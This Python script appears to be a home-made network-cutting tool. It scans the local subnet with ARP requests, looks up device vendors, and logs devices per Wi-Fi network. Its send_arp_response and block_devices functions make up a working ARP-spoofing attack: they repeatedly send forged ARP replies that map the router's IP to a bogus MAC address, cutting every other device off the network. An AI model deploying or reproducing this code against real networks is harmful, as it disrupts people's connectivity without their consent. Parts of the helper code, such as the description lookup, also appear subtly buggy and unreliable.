

from scapy.all import ARP, Ether, srp  ,send

from time import sleep
from datetime import datetime
from socket import gethostname,gethostbyname
from requests import get
from getmac import get_mac_address
from subprocess import check_output
from json import loads
from os import remove


class device:
    def __init__(self,ip=None,mac=None,desc="") -> None:
        self.ip=ip
        self.mac=mac
        self.desc=desc
    def __str__(self) -> str:
        return "ip:{}\tmac:{}\t{}".format(self.ip,self.mac,self.desc)

hostname = gethostname()
IPAddr = gethostbyname(hostname)
MACAddr=get_mac_address()

currentuser=device(IPAddr,MACAddr)


def printcolor(message):
    print("\033[94m {}\033[00m" .format(message),end="")

def error(message):
    print("\033[91m {}\033[00m" .format(message)) # red

def ask(message):
    print("\033[96m {}\033[00m" .format(message),end="")

def success(message):
    print("\033[92m {}\033[00m" .format(message))

def parse_args(args):
    return " ".join(args.split()).split()

def set_devices(devices2):
    global devices
    devices=devices2

def get_wifi_ssid():
    return check_output("netsh wlan show interfaces").split(b" Profil               \xff: ")[1].split(b" \r\n\r\n")[0].decode()

wifi_name=get_wifi_ssid()


def get_vendor(mac_address):
    url = f"https://api.maclookup.app/v2/macs/{mac_address}"
    response = get(url)
    if response.status_code!=200:
        error("api error : cant fetch vendor name ")
        return None
    response=loads(response.text)
    return response["company"]


def get_mac(ip):
    arp_request = ARP(pdst=ip) 
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answ = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answ if len(answ) else None


trials=3   # 1 isnt good (tested) accuracy 50%
def get_devices(ip=currentuser.ip,max=25):
    try : 
        ip=ip.split(".")
        res=[]
        for i in range(1,max):
            ip[-1]=str(i)
            if ".".join(ip)==currentuser.ip:
                continue
            for j in range(trials):
                ans=get_mac(".".join(ip))
                if ans != None:
                    res.append(device(ip=ans[0][1].psrc,mac=ans[0][1].hwsrc,desc=find_description(ans[0][1].hwsrc)))
                    break
        return res
    except KeyboardInterrupt:
        error("you interrupted the scan , you might not get all the devices in the network . if you want to use the cached ip's from last time use the get_saved_devices command")
        return res



wrong_mac_address="5c:fb:3a:99:f0:a0"
def send_arp_response(router,target,mitm=currentuser):
    packet = ARP(op=2, pdst=target.ip,
                       hwdst=target.mac, psrc=router.ip,hwsrc=wrong_mac_address)
    send(packet)



def write_logs(logs):
    with open("logs/"+wifi_name,"w") as f:
        f.write(datetime.now().strftime("%d/%m/%Y %H:%M")+"\n")
        for device in logs:
            if device.desc!="":
                save_mac(device.mac,device.desc)        
            f.write(str(device)+"\n")
        

def save_mac(mac,desc):
    with open("logs/mac","r+") as f:
        content=f.read()
        a=content.find(mac)
        if a!=-1:
            old=content[:a+18]
            b=content[a+18:].find("\n")
            saved=content[a+18+b:]
            f.truncate(0)
            #newfile = open("logs/mac","w")
            f.seek(0,0)
            f.write(old+desc+saved)
            #newfile.close()
        else:
            f.seek(0,2)
            f.write(mac+";"+desc+"\n")            
            f.truncate()
            
            
def parseDevice(line):
    line=line.split("\t")
    return line[0].split(":")[1] , line[1].split("mac:")[1]

def find_description(mac):
    with open ("logs/mac") as f:
        content=f.read()
        a=content.find(mac)
        if a!=-1:
            b=content[a:].find("\n")
            return content[a+18:b]
        else:
            return ""           
        
             
def read_logs():
    
    res=[]
    with open("logs/"+wifi_name,"r") as f:
        content=f.readlines()
        modif_time=content[0][:-1]
        license=content[1:]
        
        for i in license:
            ip,mac=parseDevice(i)
            desc=find_description(mac)
            res.append(device(ip,mac,desc))
    return res , modif_time
            



def block_devices(devices,router):  
    while 1:
        try:
            for device in devices:
                if device.mac==router.mac:
                    continue
                send_arp_response(router,device)
            sleep(3)
        except KeyboardInterrupt:
            success("we're done")
            return
        
def get_router(devices,router):  # get router from devices
    if not router:
        ip=min([device.ip for device in devices])
        return [device for device in devices if device.ip==ip][0]
    else:
        return router







